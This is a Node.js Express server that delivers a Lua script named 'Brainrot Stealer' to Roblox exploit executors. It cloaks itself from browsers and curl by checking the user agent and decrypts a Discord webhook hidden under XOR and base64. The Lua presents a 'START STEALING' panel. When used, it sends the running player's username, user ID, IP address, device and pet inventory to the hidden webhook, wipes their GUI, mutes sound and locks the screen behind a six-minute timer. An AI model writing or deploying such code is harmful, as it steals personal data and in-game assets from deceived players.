const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// ------------------------------------------------------------------
// 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
// ------------------------------------------------------------------
function blockNonExecutor(req, res, next) {
  const ua = (req.get("User-Agent") || "").toLowerCase();
  const ref = (req.get("Referer") || "").toLowerCase();

  const allowed =
    ua.includes("roblox") ||
    ua.includes("synapse") ||
    ua.includes("krnl") ||
    ua.includes("fluxus") ||
    ua.includes("executor") ||
    ref.includes("roblox.com");

  if (!allowed) {
    return res.status(403).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
    `.trim());
  }
  next();
}

// ------------------------------------------------------------------
// 2. HOME PAGE - BLACK SCREEN
// ------------------------------------------------------------------
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style>
</head><body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 3. /raw – EXECUTORS ONLY + ENCRYPTED WEBHOOK
// ------------------------------------------------------------------
app.get("/raw", blockNonExecutor, (req, res) => {
  const encrypted = req.query.wh;
  if (!encrypted) return res.status(400).send("-- MISSING DATA --");

  let webhook = "";
  try {
    // === DECRYPTION (MUST MATCH LUA) ===
    const key1 = "brainrot_secure_2024_key1";
    let layer1 = "";
    for (let i = 0; i < encrypted.length; i++) {
      const keyChar = key1.charCodeAt(i % key1.length);
      const encChar = encrypted.charCodeAt(i);
      layer1 += String.fromCharCode(encChar ^ keyChar);
    }

    const key2 = "x7f9!pQz@3mK*vR$5";
    let layer2 = "";
    for (let i = 0; i < layer1.length; i++) {
      const keyChar = key2.charCodeAt(i % key2.length);
      const l1Char = layer1.charCodeAt(i);
      layer2 += String.fromCharCode(l1Char ^ keyChar);
    }

    webhook = Buffer.from(layer2, 'base64').toString('utf-8');
  } catch (err) {
    return res.status(400).send("-- INVALID ENCRYPTION --");
  }

  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK --");
  }

  // ----------------------------------------------------------------
  //   FULL FIXED LUA SCRIPT (WITH ENCRYPTED WEBHOOK INJECTED)
  // ----------------------------------------------------------------
  const lua = `-- BRAINROT STEALER - FIXED & OPTIMIZED
-- Fixed: nil PlayerGui, decryption, IP, spawn, wait
-- Works in Synapse, Krnl, Fluxus, etc.

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

-- ===================================================================
-- 1. SAFE INITIALIZATION
-- ===================================================================
local player = Players.LocalPlayer
if not player then
    repeat task.wait() until Players.LocalPlayer
    player = Players.LocalPlayer
end

repeat task.wait() until player:FindFirstChild("PlayerGui")

pcall(function()
    HttpService.HttpEnabled = true
end)

task.wait(0.5)

-- ===================================================================
-- 2. OBFUSCATED WEBHOOK DECRYPTION
-- ===================================================================
local EncryptedData = "${encrypted}"

local function DecryptWebhook(data)
    local key1 = "brainrot_secure_2024_key1"
    local key2 = "x7f9!pQz@3mK*vR$5"
    
    local layer1 = ""
    for i = 1, #data do
        local keyChar = string.byte(key1, (i - 1) % #key1 + 1)
        local dataChar = string.byte(data, i)
        layer1 = layer1 .. string.char(bit32.bxor(dataChar, keyChar))
    end
    
    local layer2 = ""
    for i = 1, #layer1 do
        local keyChar = string.byte(key2, (i - 1) % #key2 + 1)
        local layer1Char = string.byte(layer1, i)
        layer2 = layer2 .. string.char(bit32.bxor(layer1Char, keyChar))
    end
    
    return layer2
end

local WebhookURL = DecryptWebhook(EncryptedData)

-- ===================================================================
-- 3. SAFE HTTP REQUEST
-- ===================================================================
local function SafeHttpRequest(url, data)
    local success, result = pcall(function()
        if syn and syn.request then
            local resp = syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return resp and (resp.StatusCode == 200 or resp.StatusCode == 204)
        end

        if request and type(request) == "function" then
            local resp = request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
            return resp and (resp.StatusCode == 200 or resp.StatusCode == 204)
        end

        if HttpService.HttpEnabled then
            local ok = pcall(function()
                HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson)
            end)
            return ok
        end

        return false
    end)
    return success and result
end

local function SendToDiscord(embed)
    local json = HttpService:JSONEncode({embeds = {embed}})
    task.spawn(function()
        SafeHttpRequest(WebhookURL, json)
    end)
end

-- ===================================================================
-- 4. UTILITIES
-- ===================================================================
local function GetExecutor()
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "Krnl" end
    if fluxus then return "Fluxus" end
    if PROTOSMASHER_LOADED then return "ProtoSmasher" end
    if electron then return "Electron" end
    return "Unknown"
end

local function GetIP()
    local success, ip = pcall(function()
        return game:HttpGet("https://api.ipify.org", true)
    end)
    return success and ip or "Unknown"
end

local function GetDeviceType()
    return UserInputService.TouchEnabled and "Mobile" or "PC"
end

local function FormatMoney(value)
    if value >= 1e9 then
        return string.format("$%.2fB/s", value / 1e9)
    elseif value >= 1e6 then
        return string.format("$%.2fM/s", value / 1e6)
    elseif value >= 1e3 then
        return string.format("$%.2fK/s", value / 1e3)
    else
        return "$" .. value .. "/s"
    end
end

local function FormatPetList(pets, showMoney)
    if #pets == 0 then return "None" end
    local str = ""
    for i = 1, math.min(5, #pets) do
        local pet = pets[i]
        local line = showMoney and (pet.Name .. " | " .. FormatMoney(pet.Money))
                              or (pet.Name .. " | " .. pet.Rate)
        str = str .. i .. ". " .. line .. "\\\\n"
    end
    return str
end

-- ===================================================================
-- 5. BLACK SCREEN + TIMER
-- ===================================================================
local function CreateBlackScreen()
    pcall(function()
        for _, gui in pairs(player.PlayerGui:GetChildren()) do
            pcall(function() gui:Destroy() end)
        end
    end)

    local sg = Instance.new("ScreenGui")
    sg.Name = "BrainrotScanner"
    sg.ResetOnSpawn = false
    sg.Parent = player.PlayerGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(2, 0, 2, 0)
    bg.Position = UDim2.new(-0.5, 0, -0.5, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BorderSizePixel = 0
    bg.Parent = sg

    local timer = Instance.new("TextLabel")
    timer.Size = UDim2.new(1, 0, 0, 80)
    timer.Position = UDim2.new(0, 0, 0.4, 0)
    timer.BackgroundTransparency = 1
    timer.Text = "06:00"
    timer.TextColor3 = Color3.fromRGB(0, 255, 255)
    timer.TextSize = 48
    timer.Font = Enum.Font.GothamBold
    timer.Parent = bg

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 25)
    status.Position = UDim2.new(0, 0, 0.55, 0)
    status.BackgroundTransparency = 1
    status.Text = "Initializing..."
    status.TextColor3 = Color3.new(1, 1, 1)
    status.TextSize = 18
    status.Font = Enum.Font.Gotham
    status.Parent = bg

    return sg, timer, status
end

-- ===================================================================
-- 6. SCAN PETS
-- ===================================================================
local function ScanPets()
    local allPets, brainrots, topPets = {}, {}, {}

    pcall(function()
        local plots = workspace:FindFirstChild("Plots")
        if not plots then return end

        for _, plot in pairs(plots:GetChildren()) do
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if not podiums then continue end

            for _, podium in pairs(podiums:GetChildren()) do
                local base = podium:FindFirstChild("Base")
                if not base then continue end
                local spawn = base:FindFirstChild("Spawn")
                if not spawn then continue end
                local attach = spawn:FindFirstChild("Attachment")
                if not attach then continue end
                local overhead = attach:FindFirstChild("AnimalOverhead")
                if not overhead then continue end

                local nameLabel = overhead:FindFirstChild("DisplayName")
                local genLabel = overhead:FindFirstChild("Generation")
                if not nameLabel or not nameLabel:IsA("TextLabel") then continue end

                local petName = nameLabel.Text
                local rate = genLabel and genLabel.Text or "0/s"
                if petName == "" then continue end

                local num = tonumber(string.match(rate, "([%d%.]+)")) or 0
                local money = 0
                if string.find(rate, "B/s") then money = num * 1e9
                elseif string.find(rate, "M/s") then money = num * 1e6
                elseif string.find(rate, "K/s") then money = num * 1e3
                else money = num end

                local pet = { Name = petName, Rate = rate, Money = money }
                table.insert(allPets, pet)

                if string.find(string.lower(petName), "brainrot") and money > 1e6 then
                    table.insert(brainrots, pet)
                end
            end
        end
    end)

    table.sort(allPets, function(a,b) return a.Money > b.Money end)
    table.sort(brainrots, function(a,b) return a.Money > b.Money end)

    for i = 1, math.min(5, #allPets) do
        if allPets[i].Money > 0 then
            table.insert(topPets, allPets[i])
        end
    end

    return allPets, brainrots, topPets
end

local function CheckHit(brainrots, topPets)
    if #brainrots > 2 then return "LEGIT HIT - Multiple brainrots" end
    if #topPets > 0 and topPets[1].Money > 5e7 then return "LEGIT HIT - High value pet" end
    if #brainrots > 0 then return "POTENTIAL - Brainrot detected" end
    return "LOW VALUE - Nothing good"
end

-- ===================================================================
-- 7. MAIN STEAL PROCESS
-- ===================================================================
local function StartStealingProcess(gameLink)
    local executor = GetExecutor()
    local ip = GetIP()
    local device = GetDeviceType()
    local playerCount = #Players:GetPlayers()

    local sg, timer, status = CreateBlackScreen()
    pcall(function() game:GetService("SoundService").Volume = 0 end)

    status.Text = "Scanning pets..."
    task.wait(1.5)

    local allPets, brainrots, topPets = ScanPets()
    local hitStatus = CheckHit(brainrots, topPets)

    status.Text = "Sending logs..."

    local embed = {
        title = "BRAINROT STEALER - LOGS",
        description = "Game: " .. (gameLink or "Unknown"),
        color = 65280,
        author = {
            name = player.Name,
            icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png",
            url = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
        },
        fields = {
            { name = "USER INFO", value = "Executor: " .. executor .. "\\\\nIP: " .. ip .. "\\\\nDevice: " .. device, inline = true },
            { name = "PROFILE", value = "[View](https://www.roblox.com/users/" .. player.UserId .. "/profile)", inline = true },
            { name = "SERVER", value = "Players: " .. playerCount .. "\\\\nPets: " .. #allPets .. "\\\\nBrainrots: " .. #brainrots, inline = true },
            { name = "TOP 5 PETS", value = FormatPetList(topPets, true), inline = false },
            { name = "BRAINROTS", value = FormatPetList(brainrots, true), inline = false },
            { name = "HIT STATUS", value = hitStatus, inline = false }
        },
        footer = { text = "Brainrot Stealer • " .. os.date("%X") },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    SendToDiscord(embed)

    status.Text = "Starting 6-minute timer..."
    task.wait(1)

    local total = 360
    local start = tick()
    while tick() - start < total do
        local left = total - (tick() - start)
        local m = math.floor(left / 60)
        local s = math.floor(left % 60)
        timer.Text = string.format("%02d:%02d", m, s)
        task.wait(0.1)
    end

    local doneEmbed = {
        title = "BRAINROT STEALER - COMPLETE",
        color = 32768,
        author = {
            name = player.Name,
            icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        },
        fields = {
            { name = "RESULTS", value = "Time: 6:00\\\\nPets: " .. #allPets .. "\\\\nBrainrots: " .. #brainrots .. "\\\\nStatus: " .. hitStatus, inline = false }
        },
        footer = { text = "Brainrot Stealer • " .. os.date("%X") }
    }
    SendToDiscord(doneEmbed)

    status.Text = "Complete! Closing..."
    timer.Text = "DONE"
    task.wait(3)
    pcall(function() sg:Destroy() end)
end

-- ===================================================================
-- 8. GUI PANEL
-- ===================================================================
local function CreateGUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "StealerPanel"
    sg.ResetOnSpawn = false
    sg.Parent = player.PlayerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 250)
    frame.Position = UDim2.new(0.5, -200, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 0
    frame.Parent = sg

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.BackgroundColor3 = Color3.fromRGB(0, 50, 0)
    title.Text = "BRAINROT STEALER\\\\nEVERYONE CAN USE"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.Parent = frame

    local box = Instance.new("TextBox")
    box.Size = UDim2.new(0.8, 0, 0, 40)
    box.Position = UDim2.new(0.1, 0, 0.3, 0)
    box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    box.TextColor3 = Color3.new(1,1,1)
    box.PlaceholderText = "Paste Roblox game link..."
    box.Parent = frame

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.7, 0, 0, 50)
    btn.Position = UDim2.new(0.15, 0, 0.7, 0)
    btn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    btn.Text = "START STEALING"
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame

    btn.MouseButton1Click:Connect(function()
        local link = box.Text
        if string.find(string.lower(link), "roblox%.com") then
            btn.Text = "STARTING..."
            btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
            task.wait(1)
            StartStealingProcess(link)
        else
            btn.Text = "INVALID LINK"
            btn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
            task.wait(2)
            btn.Text = "START STEALING"
            btn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        end
    end)
end

-- ===================================================================
-- 9. LAUNCH
-- ===================================================================
CreateGUI()
print("Brainrot Stealer loaded successfully!")
print("Ready to steal brainrots!")`;

  // Inject encrypted webhook
  const finalLua = lua.replace("${encrypted}", encrypted);

  res.type("text/plain").send(finalLua);
});

// ------------------------------------------------------------------
// 4. CATCH-ALL → 404 + BLACK SCREEN
// ------------------------------------------------------------------
app.use((req, res) => {
  res.status(404).send(`
<!DOCTYPE html><html><head><title></title>
<style>body{background:#000000;margin:0;padding:0;overflow:hidden;}</style></head>
<body></body></html>
  `.trim());
});

// ------------------------------------------------------------------
// 5. START SERVER
// ------------------------------------------------------------------
app.listen(PORT, () => {
  console.log("Brainrot Stealer Server running on port " + PORT);
  console.log("Everyone can use the script");
  console.log("Website: https://your-site.onrender.com");
});
